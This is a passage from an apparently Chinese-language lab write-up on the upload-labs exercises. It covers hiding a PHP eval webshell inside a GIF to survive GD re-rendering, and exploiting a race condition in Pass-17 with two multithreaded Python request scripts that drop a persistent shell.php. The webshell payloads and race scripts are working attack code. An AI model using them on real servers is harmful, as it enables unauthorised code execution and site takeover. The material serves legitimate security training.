&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#如果当前文件是127.0.0.1/1.php/config.php/aa?source&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;echo&lt;/span&gt; (&lt;span class=&#34;variable&#34;&gt;$_SERVER&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;PHP_SELF&amp;#x27;&lt;/span&gt;])：&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;gt;&amp;gt; /&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;.php/config.php/aa&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;好了，言归正传，本题目判断上传文件后缀名，如果满足jpg、png、gif则使用imagecreatefromjpeg()来生成一个image资源&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;resource &lt;span class=&#34;title function_ invoke__&#34;&gt;imagecreatefromjpeg&lt;/span&gt;( &lt;span class=&#34;keyword&#34;&gt;string&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;$filename&lt;/span&gt; )&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;strong&gt;参数&lt;/strong&gt;：该函数接受单个参数$filename，该参数保存图像的名称。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;返回值&lt;/strong&gt;：成功时此函数返回图像资源标识符，错误时返回FALSE。&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;---载入图像&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;title function_ invoke__&#34;&gt;imagecreatefromgif&lt;/span&gt;()：创建一块画布，并从 GIF 文件或 URL 地址载入一副图像&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;title function_ invoke__&#34;&gt;imagecreatefromjpeg&lt;/span&gt;()：创建一块画布，并从 JPEG 文件或 URL 地址载入一副图像&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;title function_ invoke__&#34;&gt;imagecreatefrompng&lt;/span&gt;()：创建一块画布，并从 PNG 文件或 URL 地址载入一副图像&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;title function_ invoke__&#34;&gt;imagecreatefromwbmp&lt;/span&gt;()：创建一块画布，并从 WBMP 文件或 URL 地址载入一副图像&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;title function_ invoke__&#34;&gt;imagecreatefromstring&lt;/span&gt;()：创建一块画布，并从字符串中的图像流新建一副图像&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;---输出图像&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;title function_ invoke__&#34;&gt;imagegif&lt;/span&gt;()：以 GIF 格式将图像输出到浏览器或文件&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;title function_ invoke__&#34;&gt;imagejpeg&lt;/span&gt;()：以 JPEG 格式将图像输出到浏览器或文件&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;title function_ invoke__&#34;&gt;imagepng&lt;/span&gt;()：以 PNG 格式将图像输出到浏览器或文件&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;title function_ invoke__&#34;&gt;imagewbmp&lt;/span&gt;()：以 WBMP 格式将图像输出到浏览器或文件&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;这个函数比较有意思，会从传入的这个&lt;code&gt;filename&lt;/code&gt;的文件中&lt;code&gt;分离出图片的信息&lt;/code&gt;，将&lt;code&gt;抛弃非图片的信息&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;分离后，使用&lt;code&gt;imagexxx()&lt;/code&gt;函数&lt;code&gt;二次渲染输出&lt;/code&gt;到浏览器中来显示。&lt;/p&gt;
&lt;p&gt;那么，&lt;strong&gt;图片马将在此题中失效&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;我们首先来看一下上传后的图片和原图片的区别：&lt;/p&gt;
&lt;p&gt;上传前—&amp;gt;&lt;code&gt;11111-before.gif&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;上传后—&amp;gt;&lt;code&gt;11111-after.gif&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;将两个文件拖入winhex&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20221004125950424.png&#34; alt=&#34;image-20221004125950424&#34;&gt;&lt;/p&gt;
&lt;p&gt;使用winhex——view——Synchronize &amp;amp; Compare，发现从0x784地址后有基本上都不一样，但是前面地址中基本没变过。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20221004130104907.png&#34; alt=&#34;image-20221004130104907&#34;&gt;&lt;/p&gt;
&lt;p&gt;因此，绕过思路就是在白色区域（没有变化的区域）中，随便找一个地方，修改十六进制为&lt;code&gt;&amp;lt;?php @eval($_POST[ABCD]);?&amp;gt;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20221004130447210.png&#34; alt=&#34;image-20221004130447210&#34;&gt;&lt;/p&gt;
&lt;p&gt;重命名为：&lt;code&gt;fix-phpimage.gif&lt;/code&gt;，上传抓包&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20221004131006052.png&#34; alt=&#34;image-20221004131006052&#34;&gt;&lt;/p&gt;
&lt;p&gt;上传成功后下载下来使用Notepad++打开查看，搜索php，发现一句话木马还在。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20221004130716362.png&#34; alt=&#34;image-20221004130716362&#34;&gt;&lt;/p&gt;
&lt;p&gt;使用菜刀连接：&lt;/p&gt;
&lt;figure class=&#34;highlight http&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;http://www.upload_lab.com/include.php?file=./upload/29139.gif&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;成功连接&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20221004130927936.png&#34; alt=&#34;image-20221004130927936&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;利用条件竞争漏洞（1）&#34;&gt;&lt;a href=&#34;#利用条件竞争漏洞（1）&#34; class=&#34;headerlink&#34; title=&#34;利用条件竞争漏洞（1）&#34;&gt;&lt;/a&gt;利用条件竞争漏洞（1）&lt;/h2&gt;&lt;p&gt;Pass-17为例&lt;/p&gt;
&lt;p&gt;阅读源码&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$is_upload&lt;/span&gt; = &lt;span class=&#34;literal&#34;&gt;false&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$msg&lt;/span&gt; = &lt;span class=&#34;literal&#34;&gt;null&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(&lt;span class=&#34;keyword&#34;&gt;isset&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$_POST&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;submit&amp;#x27;&lt;/span&gt;]))&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;variable&#34;&gt;$ext_arr&lt;/span&gt; = &lt;span class=&#34;keyword&#34;&gt;array&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;#x27;jpg&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;#x27;png&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;#x27;gif&amp;#x27;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;variable&#34;&gt;$file_name&lt;/span&gt; = &lt;span class=&#34;variable&#34;&gt;$_FILES&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;upload_file&amp;#x27;&lt;/span&gt;][&lt;span class=&#34;string&#34;&gt;&amp;#x27;name&amp;#x27;&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;variable&#34;&gt;$temp_file&lt;/span&gt; = &lt;span class=&#34;variable&#34;&gt;$_FILES&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;upload_file&amp;#x27;&lt;/span&gt;][&lt;span class=&#34;string&#34;&gt;&amp;#x27;tmp_name&amp;#x27;&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;variable&#34;&gt;$file_ext&lt;/span&gt; = &lt;span class=&#34;title function_ invoke__&#34;&gt;substr&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$file_name&lt;/span&gt;,&lt;span class=&#34;title function_ invoke__&#34;&gt;strrpos&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$file_name&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.&amp;quot;&lt;/span&gt;)+&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;variable&#34;&gt;$upload_file&lt;/span&gt; = UPLOAD_PATH . &lt;span class=&#34;string&#34;&gt;&amp;#x27;/&amp;#x27;&lt;/span&gt; . &lt;span class=&#34;variable&#34;&gt;$file_name&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(&lt;span class=&#34;title function_ invoke__&#34;&gt;move_uploaded_file&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$temp_file&lt;/span&gt;, &lt;span class=&#34;variable&#34;&gt;$upload_file&lt;/span&gt;))&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(&lt;span class=&#34;title function_ invoke__&#34;&gt;in_array&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$file_ext&lt;/span&gt;,&lt;span class=&#34;variable&#34;&gt;$ext_arr&lt;/span&gt;))&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;             &lt;span class=&#34;variable&#34;&gt;$img_path&lt;/span&gt; = UPLOAD_PATH . &lt;span class=&#34;string&#34;&gt;&amp;#x27;/&amp;#x27;&lt;/span&gt;. &lt;span class=&#34;title function_ invoke__&#34;&gt;rand&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;10&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;99&lt;/span&gt;).&lt;span class=&#34;title function_ invoke__&#34;&gt;date&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;YmdHis&amp;quot;&lt;/span&gt;).&lt;span class=&#34;string&#34;&gt;&amp;quot;.&amp;quot;&lt;/span&gt;.&lt;span class=&#34;variable&#34;&gt;$file_ext&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;             &lt;span class=&#34;title function_ invoke__&#34;&gt;rename&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$upload_file&lt;/span&gt;, &lt;span class=&#34;variable&#34;&gt;$img_path&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;             &lt;span class=&#34;variable&#34;&gt;$is_upload&lt;/span&gt; = &lt;span class=&#34;literal&#34;&gt;true&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125;&lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;variable&#34;&gt;$msg&lt;/span&gt; = &lt;span class=&#34;string&#34;&gt;&amp;quot;只允许上传.jpg|.png|.gif类型文件！&amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;title function_ invoke__&#34;&gt;unlink&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$upload_file&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;variable&#34;&gt;$msg&lt;/span&gt; = &lt;span class=&#34;string&#34;&gt;&amp;#x27;上传出错！&amp;#x27;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;依旧是分析主逻辑：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;设置白名单，&lt;code&gt;jpg&lt;/code&gt;、&lt;code&gt;png&lt;/code&gt;、&lt;code&gt;gif&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;获取文件原始名、临时文件（带路径）、文件后缀&lt;/li&gt;
&lt;li&gt;&lt;code&gt;upload_file&lt;/code&gt;为&lt;code&gt;上传路径&lt;/code&gt;+&lt;code&gt;/&lt;/code&gt;+&lt;code&gt;文件原始名&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;判断是否临时文件能成功移动到永久目录&lt;ul&gt;
&lt;li&gt;过滤好白名单后缀，设置&lt;code&gt;img_path&lt;/code&gt;为&lt;code&gt;上传路径&lt;/code&gt;+&lt;code&gt;/&lt;/code&gt;+&lt;code&gt;随机数&lt;/code&gt;+&lt;code&gt;时间戳&lt;/code&gt;+&lt;code&gt;.&lt;/code&gt;+&lt;code&gt;后缀&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;使用&lt;code&gt;rename()&lt;/code&gt;函数将&lt;code&gt;upload_file&lt;/code&gt;这个路径 &lt;strong&gt;重命名&lt;/strong&gt; 成&lt;code&gt;img_path&lt;/code&gt;这个路径&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;整个&lt;code&gt;上传后&lt;/code&gt;的过程可以再精简为&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;code&gt;move_uploaded_file()&lt;/code&gt;复制&lt;/li&gt;
&lt;li&gt;&lt;code&gt;in_array()&lt;/code&gt;判断后缀是否在白名单内&lt;/li&gt;
&lt;li&gt;&lt;code&gt;rename()&lt;/code&gt;重命名成随机文件名&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;在这三步的过程中，如果是通过多个线程来同时进行，会存在&lt;code&gt;条件竞争&lt;/code&gt;漏洞。&lt;/p&gt;
&lt;p&gt;也就是说，总会有那么一种时刻，复制好以后“&lt;strong&gt;还没来得及&lt;/strong&gt;判断和重命名”，这时就有个请求访问到了我们的上传文件。&lt;/p&gt;
&lt;p&gt;所以即使不是&lt;code&gt;jpg&lt;/code&gt;、&lt;code&gt;png&lt;/code&gt;、&lt;code&gt;gif&lt;/code&gt;也没关系了，只要请求在复制好以后过来访问，就可以访问上传后的文件。&lt;/p&gt;
&lt;p&gt;不过有几个事情需要注意：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;访问的文件如果是个php，就可以成功解析执行。&lt;/li&gt;
&lt;li&gt;不过由于之后还会因为继续走到步骤2判断，这时候php文件不满足白名单后缀，所以依旧会被unlink删除。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;那么我们可以让这个上传php在&lt;code&gt;被访问后&lt;/code&gt;到&lt;code&gt;被删之前&lt;/code&gt;干如下的事情：&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;lt;?php&lt;/span&gt; &lt;span class=&#34;title function_ invoke__&#34;&gt;fputs&lt;/span&gt;(&lt;span class=&#34;title function_ invoke__&#34;&gt;fopen&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;#x27;shell.php&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;#x27;w&amp;#x27;&lt;/span&gt;),&lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;lt;?php @eval($_POST[&amp;quot;cmd&amp;quot;])?&amp;gt;&amp;#x27;&lt;/span&gt;);&lt;span class=&#34;meta&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;strong&gt;妙啊~&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;被删之前创建一个shell.php，保留下来，而里面正好就是一句话木马。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;第一个线程池&lt;/code&gt;做&lt;code&gt;上传&lt;/code&gt;代码：&lt;/p&gt;
&lt;p&gt;&lt;code&gt;注意&lt;/code&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;用到了&lt;code&gt;hackhttp&lt;/code&gt;库和&lt;code&gt;Pool&lt;/code&gt;库&lt;/li&gt;
&lt;li&gt;本来的backdoor.php中只含有一句话木马，我们需要在抓包时给它替换成&lt;code&gt;生成shell.php那一句代码&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;在使用&lt;code&gt;pool&lt;/code&gt;的&lt;code&gt;map&lt;/code&gt;方法的时候，第一个参数为线程要处理函数，第二个参数为处理函数的参数……&lt;/li&gt;
&lt;/ul&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; hackhttp&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; multiprocessing.dummy &lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; Pool &lt;span class=&#34;keyword&#34;&gt;as&lt;/span&gt; ThreadPool&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;upload&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;counts&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    hh = hackhttp.hackhttp()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    raw = &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;quot;&amp;quot;POST /Pass-17/index.php?action=show_code HTTP/1.1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;Host: www.upload_lab.com&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;User-Agent: Mozilla/5.0 (Windows NT 5.2; WOW64; rv:15.0) Gecko/20100101 Firefox/15.0.1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;Accept-Language: zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;Accept-Encoding: gzip, deflate&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;Proxy-Connection: keep-alive&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;Referer: http://www.upload_lab.com/Pass-17/index.php?action=show_code&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;Content-Type: multipart/form-data; boundary=---------------------------31673223865021&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;Content-Length: 345&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;-----------------------------31673223865021&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;Content-Disposition: form-data; name=&amp;quot;upload_file&amp;quot;; filename=&amp;quot;backdoor.php&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;Content-Type: application/octet-stream&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;&amp;lt;?php fputs(fopen(&amp;#x27;shell.php&amp;#x27;,&amp;#x27;w&amp;#x27;),&amp;#x27;&amp;lt;?php @eval($_POST[&amp;quot;cmd&amp;quot;])?&amp;gt;&amp;#x27;);?&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;-----------------------------31673223865021&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;Content-Disposition: form-data; name=&amp;quot;submit&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;submit&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;-----------------------------31673223865021--&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;quot;&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    code,head,html,redirect,log = hh.http(&lt;span class=&#34;string&#34;&gt;&amp;#x27;http://www.upload_lab.com/Pass-17/index.php&amp;#x27;&lt;/span&gt;,raw=raw)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt; code&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;pool = ThreadPool(&lt;span class=&#34;number&#34;&gt;50&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;pool.&lt;span class=&#34;built_in&#34;&gt;map&lt;/span&gt;(upload,&lt;span class=&#34;built_in&#34;&gt;range&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;10000&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;pool.close()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;pool.join()&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;code&gt;第二个线程池&lt;/code&gt;做&lt;code&gt;请求访问&lt;/code&gt;代码：&lt;/p&gt;
&lt;p&gt;&lt;code&gt;注意&lt;/code&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;请求的地址为&lt;code&gt;&amp;#39;http://www.upload_lab.com/upload/backdoor.php&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;在使用&lt;code&gt;pool&lt;/code&gt;的&lt;code&gt;map&lt;/code&gt;方法的时候，第一个参数为线程要处理函数，第二个参数为处理函数的参数……&lt;/li&gt;
&lt;/ul&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; hackhttp&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; multiprocessing.dummy &lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; Pool &lt;span class=&#34;keyword&#34;&gt;as&lt;/span&gt; ThreadPool&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;upload&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;counts&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    hh = hackhttp.hackhttp()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    code,head,html,redirect,log = hh.http(&lt;span class=&#34;string&#34;&gt;&amp;#x27;http://www.upload_lab.com/upload/backdoor.php&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt; code&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;pool = ThreadPool(&lt;span class=&#34;number&#34;&gt;50&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;pool.&lt;span class=&#34;built_in&#34;&gt;map&lt;/span&gt;(upload,&lt;span class=&#34;built_in&#34;&gt;range&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;5000&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;pool.close()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;pool.join()&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;可以看到左边上传成功，右边在请求的时候，会有几次是200请求成功的。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20221004135312736.png&#34; alt=&#34;image-20221004135312736&#34;&gt;&lt;/p&gt;
&lt;p&gt;再次刷新文件夹，就会有shell.php产生&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20221004135517602.png&#34; alt=&#34;image-20221004135517602&#34;&gt;&lt;/p&gt;
&lt;p&gt;菜刀成功连接。&lt;/p&gt;
